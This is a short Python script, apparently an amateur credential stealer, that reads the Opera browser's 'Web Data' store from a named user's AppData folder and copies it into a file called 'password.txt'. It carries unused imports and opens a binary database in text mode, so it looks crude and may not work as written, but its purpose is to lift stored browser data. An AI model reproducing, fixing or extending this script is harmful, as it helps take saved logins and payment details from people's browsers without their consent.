import os,glob
import webbrowser
import shutil
import progressbar
folder = 'C:\\Users\\Гусев\\AppData\\Roaming\\Opera Software\\Opera Stable\\Web Data'
file= open(folder,'r')
s=file.read()
file.close()

new_file= open('password.txt','w')
new_file.write(s)
new_file.close()
input()



